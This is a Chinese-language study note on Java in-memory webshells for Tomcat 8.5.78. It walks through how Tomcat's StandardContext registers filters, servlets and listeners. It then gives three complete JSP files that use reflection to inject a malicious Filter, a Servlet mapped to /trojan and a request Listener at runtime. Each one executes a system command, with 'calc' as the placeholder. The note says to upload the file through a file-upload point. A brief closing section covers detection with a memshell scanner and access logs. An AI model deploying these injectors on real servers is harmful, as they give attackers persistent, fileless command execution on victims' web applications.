---
title: Memory_Trojan_Java
categories:
- Network_Security
- Web
- Java_Security
- Memory_Trojan_Java
tags:
- Network_Security
date: 2024-01-14 11:44:53
---

# Java 内存马

## 1. 基于 Servlet API 相关的 JSP 动态注册内存马（版本 Tomcat 8.5.78）

1. 参考笔记：

    > https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC
    > https://cloud.tencent.com/developer/beta/article/1946227

2. todo：Servlet、Filter、Listener 的底层注册流程。

### 1.1 Filter 内存马

1. su18 师傅的文章中，其提到了一些关键点：

    > 1. 可以看到，这个方法创建了一个 FilterDef 对象，将 filterName、filterClass、filter 对象初始化进去，**使用 StandardContext 的 `addFilterDef` 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中**，然后 new 了一个 ApplicationFilterRegistration 对象并且返回，并没有将这个 Filter 放到 FilterChain 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。
    >
    > 2. 通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，**需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。**
    >
    > 3. **在之前的 ApplicationContext 的 addFilter 中将 filter 初始化存在了 StandardContext 的 filterDefs 中**，那后面又是如何添加在其他参数中的呢？

2. 总的来看，注册一个 Filter，需要往 `StandardContext ` 中的 `filterDefs`、`filterMaps`、和 `filterConfigs` 添加对应的内容才能保证注册成功。

3. 在 `ContextConfig` 这个类中，Tomcat 完成 Context 的一些属性的配置和初始化，其中就包括 Filter、Listener 和 Servlet。
    ![image-20230505201931118](image-20230505201931118.png)

4. 其次，`ContextConfig` 中的方法 `configureContext()`，里面就对 `StandardContext` 进行了初始化。在里面打断点调试一下，可以看到 `standardContext` 有很多属性，其中包括 Filter、Listener 和 Servlet（即在该方法中注册）。
    ![image-20230505203127496](image-20230505203127496.png)

5. 如何获取到 `StandardContext` 呢，一般程序拿到 Context 都是通过 `request.getServletContext()` 方法，但是该方法拿到的是 `ApplicationContextFacade`，打个断点看看其内容，最终发现 `StandardContext`：
    ![image-20230505203448096](image-20230505203448096.png)
    即 `ApplicationContextFacade` 的 `context` 的 `context`。
    因此通过反射获取。

6.  最终写的木马如下：
    ```jsp
    <%@ page import="javax.servlet.annotation.WebFilter" %>
    <%@ page import="java.io.IOException" %>
    <%@ page import="java.lang.reflect.Field" %>
    <%@ page import="org.apache.catalina.core.ApplicationContext" %>
    <%@ page import="org.apache.catalina.core.StandardContext" %>
    <%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
    <%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
    <%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
    <%@ page import="java.lang.reflect.InvocationTargetException" %>
    <%@ page import="javax.naming.NamingException" %>
    <%@ page import="java.lang.reflect.Constructor" %>
    <%@ page import="java.util.HashMap" %>
    <%@ page import="org.apache.catalina.Context" %><%--
      Created by IntelliJ IDEA.
      User: hasee
      Date: 2023/5/5
      Time: 9:58
      To change this template use File | Settings | File Templates.
    --%>
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Title</title>
    </head>
    <body>
    <%!
        @WebFilter(urlPatterns = "/*")
        public class MemoryTrojanFilter implements Filter {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
            }
    
            @Override
            public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
                Runtime.getRuntime().exec("calc");
                chain.doFilter(request, response);
            }
    
            @Override
            public void destroy() {
            }
        }
    %>
    <%
        // 动态注册 Filter
        // 1. 获取 StandardContext
        ServletContext servletContext = request.getServletContext();
        // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
        Field applicationContextField = servletContext.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);
        // 通过反射拿到 servletContext 具体的 ApplicationContext
        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
        // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
        // 2. 向 standardContext 的 filterConfigs、filterDefs、filterMaps 中插入值
        // 2.1.1 先创建 filterDef
        FilterDef filterDef = new FilterDef();
        MemoryTrojanFilter memoryTrojanFilter = new MemoryTrojanFilter();
        filterDef.setFilter(memoryTrojanFilter);
        filterDef.setFilterClass(String.valueOf(memoryTrojanFilter.getClass()));
        filterDef.setFilterName(memoryTrojanFilter.getClass().getName());
        // 2.1.2 往 filterDefs 里面插值
        standardContext.addFilterDef(filterDef);
        // 2.2.1 创建 filterMap
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(memoryTrojanFilter.getClass().getName());
        filterMap.addURLPattern("/*");
        // 2.2.2 插入到 filterMaps
        standardContext.addFilterMap(filterMap);
        // 2.3.1 创建 ApplicationFilterConfig
        // 无法通过 new 直接创建，因为 ApplicationFilterConfig is not public in 'org.apache...'. Cannot be accessed from outside package
        // 因此只能通过反射来创建对象
        Class<ApplicationFilterConfig> applicationFilterConfigClass = ApplicationFilterConfig.class;
        ApplicationFilterConfig applicationFilterConfig = null;
        try {
            Constructor<ApplicationFilterConfig> applicationFilterConfigConstructor = applicationFilterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);
            applicationFilterConfigConstructor.setAccessible(true);
            applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
        // 2.3.2 把 applicationFilterConfig 放入到 filterConfigs 当中，standardContext 中没有直接放入的方法，还得通过反射拿到 filterConfigs
        try {
            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);
            // 2.3.3 把 applicationFilterConfig 放入到 filterConfigs 当中
            filterConfigs.put(memoryTrojanFilter.getClass().getName(), applicationFilterConfig);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    %>
    </body>
    </html>
    ```

7. 将该代码放进一个 jsp 并上传，然后访问。之后只要访问该站点的页面，就会喜提计算器。

### 1.2 Servlet 内存马

1. 和 Filter 相似，`ContextConfig` 的 `configureContext()` 中注册了 servlet：
    ```java
    for (ServletDef servlet : webxml.getServlets().values()) {
        // 创建了一个 Wrapper 包装类
        Wrapper wrapper = context.createWrapper();
        // Description is ignored
        // Display name is ignored
        // Icons are ignored
    
        // jsp-file gets passed to the JSP Servlet as an init-param
    
        if (servlet.getLoadOnStartup() != null) {
            wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
        }
        if (servlet.getEnabled() != null) {
            wrapper.setEnabled(servlet.getEnabled().booleanValue());
        }
        // 包装类添加了 Servlet 的名字
        wrapper.setName(servlet.getServletName());
        Map<String,String> params = servlet.getParameterMap();
        for (Entry<String, String> entry : params.entrySet()) {
            wrapper.addInitParameter(entry.getKey(), entry.getValue());
        }
        wrapper.setRunAs(servlet.getRunAs());
        Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
        for (SecurityRoleRef roleRef : roleRefs) {
            wrapper.addSecurityReference(
                roleRef.getName(), roleRef.getLink());
        }
        // 包装类添加了 Servlet 的字节码
        wrapper.setServletClass(servlet.getServletClass());
        MultipartDef multipartdef = servlet.getMultipartDef();
        if (multipartdef != null) {
            long maxFileSize = -1;
            long maxRequestSize = -1;
            int fileSizeThreshold = 0;
    
            if(null != multipartdef.getMaxFileSize()) {
                maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
            }
            if(null != multipartdef.getMaxRequestSize()) {
                maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
            }
            if(null != multipartdef.getFileSizeThreshold()) {
                fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
            }
    
            wrapper.setMultipartConfigElement(new MultipartConfigElement(
                multipartdef.getLocation(),
                maxFileSize,
                maxRequestSize,
                fileSizeThreshold));
        }
        if (servlet.getAsyncSupported() != null) {
            wrapper.setAsyncSupported(
                servlet.getAsyncSupported().booleanValue());
        }
        wrapper.setOverridable(servlet.isOverridable());
        // 这里就是向 context 塞入了 wrapper
        context.addChild(wrapper);
    }
    for (Entry<String, String> entry :
         webxml.getServletMappings().entrySet()) {
        // 这里还有重要一步
        context.addServletMappingDecoded(entry.getKey(), entry.getValue());
    }
    ```

2. 模仿 `configureContext()` 的过程，编写的木马如下：
    ```jsp
    <%@ page import="javax.servlet.annotation.WebServlet" %>
    <%@ page import="java.io.IOException" %>
    <%@ page import="java.io.PrintWriter" %>
    <%@ page import="java.lang.reflect.Field" %>
    <%@ page import="org.apache.catalina.core.ApplicationContext" %>
    <%@ page import="org.apache.catalina.core.StandardContext" %>
    <%@ page import="org.apache.catalina.Wrapper" %><%--
      Created by IntelliJ IDEA.
      User: hasee
      Date: 2023/5/4
      Time: 16:38
      To change this template use File | Settings | File Templates.
    --%>
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Title</title>
    </head>
    <body>
    <%!
      @WebServlet(urlPatterns = "/trojan")
      public class MemoryTrojanServlet extends HttpServlet {
        private String message;
    
        @Override
        public void init() {
          message = "Servlet Range!";
        }
    
        @Override
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
          Runtime.getRuntime().exec("calc");
        }
      }
    %>
    <%
      // 动态注册 Servlet （前提，有一个文件上传点，这个 servlet.jsp 文件就是小马，访问后就会生成内存马）
      // 1. 获取 StandardContext
      ServletContext servletContext = request.getServletContext();
      // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
      Field applicationContextField = servletContext.getClass().getDeclaredField("context");
      applicationContextField.setAccessible(true);
      // 通过反射拿到 servletContext 具体的 ApplicationContext
      ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
      // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
      Field standardContextField = applicationContext.getClass().getDeclaredField("context");
      standardContextField.setAccessible(true);
      StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
      // 2. 将该 Servlet 注册到 Context 当中（过程和 StandardContext 注册 Servlet 一样）
      Wrapper wrapper = standardContext.createWrapper();
      wrapper.setName("MemoryTrojanServlet");
      wrapper.setServletClass(MemoryTrojanServlet.class.getName());
      // 这里需要补充一个 Servlet 的实例化，因为 Servlet 默认是懒加载的
      wrapper.setServlet(new MemoryTrojanServlet());
      standardContext.addChild(wrapper);
      // 这里就相当于写木马了，访问 /servlet 后，就会调用 MemoryTrojanServlet 的 doGet，从而喜提计算器
      standardContext.addServletMappingDecoded("/trojan", "MemoryTrojanServlet");
    %>
    </body>
    </html>
    ```

### 1.3 Listener 内存马

1. Listener 更简单，它没什么要特别设置的，但是 Listener 触发需要一定的事件。因此要选择易触发的 Listener，这里就选 `ServletRequestListener`。每次访问系统都会创建 `HttpServletRequest` 对象，从而触发 `ServletRequestListener` 中的方法。

2. 代码如下：
    ```jsp
    <%@ page import="javax.servlet.annotation.WebListener" %>
    <%@ page import="java.io.IOException" %>
    <%@ page import="java.lang.reflect.Field" %>
    <%@ page import="org.apache.catalina.core.ApplicationContext" %>
    <%@ page import="org.apache.catalina.core.StandardContext" %><%--
      Created by IntelliJ IDEA.
      User: hasee
      Date: 2023/5/5
      Time: 19:40
      To change this template use File | Settings | File Templates.
    --%>
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Title</title>
    </head>
    <body>
    <%!
        @WebListener("MemoryTrojanListener")
        public class MemoryTrojanListener implements ServletRequestListener {
    
            @Override
            public void requestDestroyed(ServletRequestEvent sre) {
    
            }
    
            @Override
            public void requestInitialized(ServletRequestEvent sre) {
                try {
                    Runtime.getRuntime().exec("calc");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    %>
    <%
        // 1. 获取 StandardContext
        ServletContext servletContext = request.getServletContext();
        // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
        Field applicationContextField = servletContext.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);
        // 通过反射拿到 servletContext 具体的 ApplicationContext
        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
        // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
    
        // 2. 通过 standardContext 添加 listener
        standardContext.addApplicationEventListener(new MemoryTrojanListener());
    %>
    </body>
    </html>
    ```

## 2. Spring

## 3. Tomcat

## 4. Java Agent 内存马



## 5. 内存马的查杀

### 5.1 针对 Servlet Api 的 JSP 木马的查杀

1. 使用 java-memshell-scanner 工具获取到应用中所有的 filter 和 servlet 相关信息。找没有对应的 class 字节码文件的 servlet 和 filter。
2. 查阅 Tomcat 的访问日志，排查可疑的访问请求。
